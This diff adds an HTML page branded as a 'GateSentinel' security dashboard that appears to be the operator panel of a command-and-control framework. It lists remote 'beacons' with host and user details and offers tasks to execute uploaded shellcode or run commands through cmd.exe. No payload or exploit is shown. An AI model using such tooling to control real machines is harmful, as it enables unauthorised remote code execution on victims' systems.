@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GateSentinel - Security Dashboard</title>
+    <meta name="description" content="GateSentinel Security Management Dashboard">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/static/css/style.css" rel="stylesheet">
+</head>
+<body class="dashboard-body">
+    <!-- Modern Navigation Bar -->
+    <nav class="navbar navbar-expand-lg">
+        <div class="container-fluid px-4">
+            <a class="navbar-brand" href="/web/admin">
+                <i class="bi bi-shield-check"></i>
+                GateSentinel
+            </a>
+
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav me-auto">
+                    <li class="nav-item">
+                        <a class="nav-link active" href="/web/admin/beacons">
+                            <i class="bi bi-grid-3x3-gap"></i>
+                            Dashboard
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/web/admin/beacons">
+                            <i class="bi bi-hdd-network"></i>
+                            Beacons
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/web/admin/settings">
+                            <i class="bi bi-gear"></i>
+                            Settings
+                        </a>
+                    </li>
+                </ul>
+
+                <ul class="navbar-nav">
+                    <li class="nav-item me-3">
+                        <span class="navbar-text">
+                            <i class="bi bi-circle-fill text-success me-1"></i>
+                            System Online
+                        </span>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" id="userDropdown" role="button" data-bs-toggle="dropdown">
+                            <i class="bi bi-person-circle"></i>
+                            Administrator
+                        </a>
+                        <ul class="dropdown-menu dropdown-menu-end">
+                            <li>
+                                <a class="dropdown-item" href="/web/admin/settings">
+                                    <i class="bi bi-gear"></i>
+                                    Settings
+                                </a>
+                            </li>
+                            <li>
+                                <a class="dropdown-item" href="#" onclick="showProfile()">
+                                    <i class="bi bi-person"></i>
+                                    Profile
+                                </a>
+                            </li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li>
+                                <a class="dropdown-item text-danger" href="#" onclick="logout()">
+                                    <i class="bi bi-box-arrow-right"></i>
+                                    Logout
+                                </a>
+                            </li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Modern Dashboard Content -->
+    <div class="container-fluid px-4 py-4">
+        <!-- Dashboard Header -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="d-flex justify-content-between align-items-center">
+                    <div>
+                        <h1 class="h2 mb-2 fw-bold">
+                            Security Dashboard
+                        </h1>
+                        <p class="text-muted mb-0">
+                            Real-time monitoring and management of your security infrastructure
+                        </p>
+                    </div>
+                    <div class="d-flex gap-2">
+                        <button class="btn btn-outline-primary" onclick="refreshDashboard()">
+                            <i class="bi bi-arrow-clockwise me-1"></i>
+                            Refresh
+                        </button>
+                        <button class="btn btn-primary" onclick="showQuickActions()">
+                            <i class="bi bi-plus-circle me-1"></i>
+                            Quick Actions
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Statistics Cards -->
+        <div class="row g-4 mb-4">
+            <div class="col-xl-3 col-md-6">
+                <div class="stats-card">
+                    <div class="d-flex align-items-center">
+                        <div class="stats-icon success me-3">
+                            <i class="bi bi-shield-check text-success"></i>
+                        </div>
+                        <div class="flex-grow-1">
+                            <div class="stats-label">Active Beacons</div>
+                            <div class="stats-value" id="onlineCount">0</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-xl-3 col-md-6">
+                <div class="stats-card">
+                    <div class="d-flex align-items-center">
+                        <div class="stats-icon warning me-3">
+                            <i class="bi bi-exclamation-triangle text-warning"></i>
+                        </div>
+                        <div class="flex-grow-1">
+                            <div class="stats-label">Warnings</div>
+                            <div class="stats-value" id="warningCount">0</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-xl-3 col-md-6">
+                <div class="stats-card">
+                    <div class="d-flex align-items-center">
+                        <div class="stats-icon danger me-3">
+                            <i class="bi bi-x-circle text-danger"></i>
+                        </div>
+                        <div class="flex-grow-1">
+                            <div class="stats-label">Offline</div>
+                            <div class="stats-value" id="offlineCount">0</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-xl-3 col-md-6">
+                <div class="stats-card">
+                    <div class="d-flex align-items-center">
+                        <div class="stats-icon info me-3">
+                            <i class="bi bi-hdd-network text-info"></i>
+                        </div>
+                        <div class="flex-grow-1">
+                            <div class="stats-label">Total Beacons</div>
+                            <div class="stats-value" id="totalCount">0</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Beacon Management Panel -->
+        <div class="row">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="row align-items-center">
+                            <div class="col">
+                                <h5 class="mb-0">
+                                    <i class="bi bi-hdd-network me-2"></i>
+                                    Beacon Management
+                                </h5>
+                                <small class="text-muted">Monitor and control connected beacons</small>
+                            </div>
+                            <div class="col-auto">
+                                <div class="d-flex gap-2 align-items-center">
+                                    <!-- Search -->
+                                    <div class="input-group" style="width: 280px;">
+                                        <span class="input-group-text">
+                                            <i class="bi bi-search"></i>
+                                        </span>
+                                        <input
+                                            type="text"
+                                            class="form-control"
+                                            id="searchInput"
+                                            placeholder="Search beacons..."
+                                            autocomplete="off"
+                                        >
+                                    </div>
+
+                                    <!-- Filter Dropdown -->
+                                    <div class="dropdown">
+                                        <button class="btn btn-outline-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown">
+                                            <i class="bi bi-funnel me-1"></i>
+                                            Filter
+                                        </button>
+                                        <ul class="dropdown-menu">
+                                            <li><h6 class="dropdown-header">Status Filter</h6></li>
+                                            <li><a class="dropdown-item" href="#" onclick="filterBeacons('all')">
+                                                <i class="bi bi-circle me-2"></i>All Beacons
+                                            </a></li>
+                                            <li><a class="dropdown-item" href="#" onclick="filterBeacons('online')">
+                                                <i class="bi bi-circle-fill text-success me-2"></i>Online Only
+                                            </a></li>
+                                            <li><a class="dropdown-item" href="#" onclick="filterBeacons('warning')">
+                                                <i class="bi bi-circle-fill text-warning me-2"></i>Warning Only
+                                            </a></li>
+                                            <li><a class="dropdown-item" href="#" onclick="filterBeacons('offline')">
+                                                <i class="bi bi-circle-fill text-danger me-2"></i>Offline Only
+                                            </a></li>
+                                        </ul>
+                                    </div>
+
+                                    <!-- Refresh Button -->
+                                    <button class="btn btn-outline-primary" onclick="refreshBeacons()" title="Refresh Data">
+                                        <i class="bi bi-arrow-clockwise"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card-body p-0">
+                        <!-- Beacon Table -->
+                        <div class="table-responsive">
+                            <table class="table table-hover mb-0">
+                                <thead>
+                                    <tr>
+                                        <th class="sortable" data-sort="status" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                Status
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th class="sortable" data-sort="hostname" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                Hostname
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th class="sortable" data-sort="username" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                User
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th class="sortable" data-sort="ip" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                IP Address
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th class="sortable" data-sort="process_name" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                Process
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th class="sortable" data-sort="arch" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                Architecture
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th class="sortable" data-sort="last_seen" style="cursor: pointer;">
+                                            <div class="d-flex align-items-center">
+                                                Last Seen
+                                                <i class="bi bi-arrow-down-up ms-1 text-muted"></i>
+                                            </div>
+                                        </th>
+                                        <th>Task Status</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="beaconList">
+                                    <!-- Dynamically populated via JavaScript -->
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <!-- Empty State -->
+                        <div id="emptyState" class="text-center py-5" style="display: none;">
+                            <div class="mb-4">
+                                <i class="bi bi-hdd-network text-muted" style="font-size: 4rem; opacity: 0.5;"></i>
+                            </div>
+                            <h4 class="text-muted mb-2">No Beacons Connected</h4>
+                            <p class="text-muted mb-4">
+                                Beacons will appear here once they establish a connection to the server.
+                            </p>
+                            <button class="btn btn-outline-primary" onclick="refreshBeacons()">
+                                <i class="bi bi-arrow-clockwise me-1"></i>
+                                Refresh
+                            </button>
+                        </div>
+
+                        <!-- Loading State -->
+                        <div id="loadingState" class="text-center py-5" style="display: none;">
+                            <div class="spinner-border text-primary mb-3" role="status">
+                                <span class="visually-hidden">Loading...</span>
+                            </div>
+                            <p class="text-muted">Loading beacon data...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Enhanced Task Modal -->
+    <div class="modal fade" id="taskModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">
+                        <i class="bi bi-send me-2"></i>Send Task to Beacon
+                    </h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <!-- Beacon Info -->
+                    <div class="alert alert-info mb-4">
+                        <div class="d-flex align-items-center">
+                            <i class="bi bi-info-circle me-2"></i>
+                            <div>
+                                <strong>Target Beacon:</strong> <span id="targetBeaconInfo">Loading...</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <form id="taskForm" novalidate>
+                        <input type="hidden" id="beaconUUID">
+
+                        <div class="mb-4">
+                            <label class="form-label fw-semibold">
+                                <i class="bi bi-gear me-2"></i>Task Type
+                            </label>
+                            <select class="form-select" id="taskType" required>
+                                <option value="">Select a task type...</option>
+                                <option value="NULL">Keep Sleep (No Action)</option>
+                                <option value="0x1A">Set Sleep Time</option>
+                                <option value="0x1B">Get Process List</option>
+                                <option value="0x1C">Execute Shellcode</option>
+                                <option value="0x1D">Execute Command</option>
+                            </select>
+                            <div class="invalid-feedback">
+                                Please select a task type.
+                            </div>
+                        </div>
+
+                        <!-- Sleep Time Configuration -->
+                        <div class="mb-4" id="sleepTimeDiv" style="display: none;">
+                            <label class="form-label fw-semibold">
+                                <i class="bi bi-clock me-2"></i>Sleep Time (seconds)
+                            </label>
+                            <div class="input-group">
+                                <input type="number" class="form-control" id="sleepTime" min="1" max="3600" placeholder="Enter sleep time">
+                                <span class="input-group-text">seconds</span>
+                            </div>
+                            <div class="form-text">
+                                Set the interval between beacon check-ins (1-3600 seconds)
+                            </div>
+                            <div class="invalid-feedback">
+                                Please enter a valid sleep time (1-3600 seconds).
+                            </div>
+                        </div>
+
+                        <!-- Shellcode Upload -->
+                        <div class="mb-4" id="shellcodeDiv" style="display: none;">
+                            <label class="form-label fw-semibold">
+                                <i class="bi bi-file-code me-2"></i>Shellcode File
+                            </label>
+                            <input type="file" class="form-control" id="shellcodeFile" accept=".bin,.txt,.hex">
+                            <div class="form-text">
+                                Upload a shellcode file (max 4MB). Supported formats: .bin, .txt, .hex
+                            </div>
+                            <div class="invalid-feedback">
+                                Please select a valid shellcode file.
+                            </div>
+
+                            <!-- File Info Display -->
+                            <div id="fileInfo" class="mt-2" style="display: none;">
+                                <div class="card bg-light">
+                                    <div class="card-body py-2">
+                                        <small class="text-muted">
+                                            <i class="bi bi-file-earmark me-1"></i>
+                                            <span id="fileName"></span>
+                                            (<span id="fileSize"></span>)
+                                        </small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Command Input -->
+                        <div class="mb-4" id="commandDiv" style="display: none;">
+                            <label for="commandInput" class="form-label fw-semibold">
+                                <i class="bi bi-terminal me-2"></i>Command to Execute
+                            </label>
+                            <textarea class="form-control" id="commandInput" rows="3" placeholder="Enter command to execute (e.g., dir, whoami, ipconfig)"></textarea>
+                            <div class="form-text">
+                                <i class="bi bi-exclamation-triangle me-1"></i>
+                                Command will be executed with cmd.exe /c. Timeout: 60 seconds.
+                            </div>
+                            <div class="invalid-feedback">
+                                Please enter a command to execute.
+                            </div>
+                        </div>
+
+                        <!-- Task Description -->
+                        <div class="mb-3">
+                            <div class="card bg-light">
+                                <div class="card-body">
+                                    <h6 class="card-title mb-2">
+                                        <i class="bi bi-info-circle me-2"></i>Task Description
+                                    </h6>
+                                    <p class="card-text mb-0" id="taskDescription">
+                                        Select a task type to see its description.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">
+                        <i class="bi bi-x-circle me-2"></i>Cancel
+                    </button>
+                    <button type="button" class="btn btn-primary" id="sendTask" disabled>
+                        <span class="spinner-border spinner-border-sm me-2" style="display: none;"></span>
+                        <i class="bi bi-send me-2"></i>Send Task
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="/static/js/security.js"></script>
+    <script src="/static/js/admin/beacons-new.js"></script>
+
+    <script>
+        // Dashboard-specific security and initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize dashboard
+            initializeDashboard();
+
+            // Setup real-time updates
+            setupRealTimeUpdates();
+
+            // Add security monitoring for admin panel
+            setupAdminSecurity();
+        });
+
+        function initializeDashboard() {
+            // Add smooth scrolling
+            document.documentElement.style.scrollBehavior = 'smooth';
+
+            // Initialize tooltips
+            const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
+            tooltipTriggerList.map(function (tooltipTriggerEl) {
+                return new bootstrap.Tooltip(tooltipTriggerEl);
+            });
+        }
+
+        function setupRealTimeUpdates() {
+            // Update timestamp display
+            setInterval(() => {
+                const now = new Date();
+                const timeString = now.toLocaleTimeString();
+                document.title = `GateSentinel - Dashboard (${timeString})`;
+            }, 1000);
+        }
+
+        function setupAdminSecurity() {
+            // Monitor for suspicious admin activity
+            let suspiciousActivity = 0;
+
+            // Track rapid clicks
+            document.addEventListener('click', function() {
+                suspiciousActivity++;
+                setTimeout(() => suspiciousActivity--, 1000);
+
+                if (suspiciousActivity > 10) {
+                    security.logSecurityEvent('rapid_clicking', {
+                        count: suspiciousActivity,
+                        timestamp: Date.now()
+                    });
+                }
+            });
+
+            // Monitor for console access attempts
+            let devtools = false;
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > 200 ||
+                    window.outerWidth - window.innerWidth > 200) {
+                    if (!devtools) {
+                        devtools = true;
+                        security.logSecurityEvent('devtools_opened', {
+                            timestamp: Date.now()
+                        });
+                    }
+                } else {
+                    devtools = false;
+                }
+            }, 500);
+        }
+
+        function refreshDashboard() {
+            // Show loading state
+            document.getElementById('loadingState').style.display = 'block';
+            document.getElementById('emptyState').style.display = 'none';
+
+            // Refresh beacon data
+            loadBeacons();
+        }
+
+        function showQuickActions() {
+            // Show quick actions modal (to be implemented)
+            alert('Quick Actions feature coming soon!');
+        }
+
+        function showProfile() {
+            // Show user profile modal (to be implemented)
+            alert('Profile management feature coming soon!');
+        }
+    </script>
+</body>
+</html>
